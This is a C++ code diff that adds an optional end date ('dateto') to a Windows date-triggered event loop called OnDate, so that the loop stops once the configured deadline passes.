@@ -303,8 +303,8 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 	Configuration *conf;
 	Date date;
 	int delay, iterations, curIterations = 0, curDelay = 0;
-	__int64 startDate, now;
-	wstring dateFrom;
+	unsigned __int64 startDate, now, endDate;
+	wstring dateFrom, dateTo;
 
 	evHandle = me->getEvent();
 
@@ -314,7 +314,13 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 	try {
 		dateFrom = conf->getString(L"datefrom");
 	} catch (...) {
-		dateFrom = L"2000-01-01 00:00:00";
+		dateFrom = L"1999-01-01 00:00:00";
+	}
+
+	try {
+		dateTo = conf->getString(L"dateto");
+	} catch (...) {
+		dateTo = L"2999-01-01 00:00:00";
 	}
 
 	try {
@@ -351,6 +357,9 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 	me->triggerStart();
 	curDelay = delay;
 
+	date.setDate(dateTo);
+	endDate = date.stringDateToMs();
+
 	LOOP {
 		WaitForSingleObject(evHandle, curDelay);
 
@@ -362,6 +371,11 @@ DWORD WINAPI OnDate(LPVOID lpParam) {
 		}
 
 		if (curIterations > iterations) {
+			me->requestStop();
+			continue;
+		}
+
+		if (date.getCurAbsoluteMs() > endDate) {
 			me->requestStop();
 			continue;
 		}
